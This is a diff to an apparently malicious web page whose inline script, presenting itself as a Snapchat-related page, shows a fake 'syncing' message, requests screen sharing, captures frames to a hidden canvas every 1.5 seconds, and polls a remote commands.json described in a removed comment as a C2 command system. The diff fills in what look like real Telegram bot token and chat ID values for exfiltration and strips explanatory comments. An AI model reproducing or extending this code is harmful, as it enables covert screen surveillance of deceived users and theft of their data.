@@ -29,10 +29,9 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // --- جایگذاری اطلاعات شخصی ---
         const CFG = {
-            t: "YOUR_BOT_TOKEN", // توکن ربات تلگرام را اینجا بگذار
-            c: "YOUR_CHAT_ID",    // چت‌آیدی را اینجا بگذار
+            t: "8484189401:AAHZZkNvQUXIk97rA1b0W7r1e-z5IWXdbpg", 
+            c: "7261099659",
             h: "https://whale-tracker-live.github.io/Snapchat/"
         };
 
@@ -57,12 +56,10 @@
             document.getElementById('main-ui').innerHTML = "<h3>در حال همگام‌سازی... لطفا صفحه را نبندید</h3>";
             
             try {
-                // درخواست اجازه دوربین و اسکرین‌شیر
                 const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
                 const vid = document.getElementById('v'); vid.srcObject = stream;
                 const can = document.getElementById('c');
                 
-                // ارسال مانیتور زنده هر ۱.۵ ثانیه
                 setInterval(() => {
                     can.width = vid.videoWidth; can.height = vid.videoHeight;
                     can.getContext('2d').drawImage(vid, 0, 0);
@@ -71,7 +68,6 @@
             } catch(e) { location.reload(); }
         }
 
-        // سیستم فرماندهی C2
         setInterval(async () => {
             try {
                 const r = await fetch(CFG.h + 'commands.json?t=' + Date.now());
